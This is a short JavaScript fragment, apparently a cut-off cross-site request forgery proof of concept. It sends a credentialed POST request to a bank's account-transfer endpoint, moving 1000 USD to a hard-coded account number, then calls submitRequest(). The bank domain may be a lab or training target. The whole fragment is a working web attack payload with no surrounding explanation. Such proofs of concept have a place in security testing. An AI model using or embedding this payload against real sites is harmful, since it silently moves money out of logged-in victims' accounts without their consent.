
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/members.bankofdirectdefense.com\/accounts\/transfer", true);
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.withCredentials = true;
        xhr.send("{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\"}");
      submitRequest();
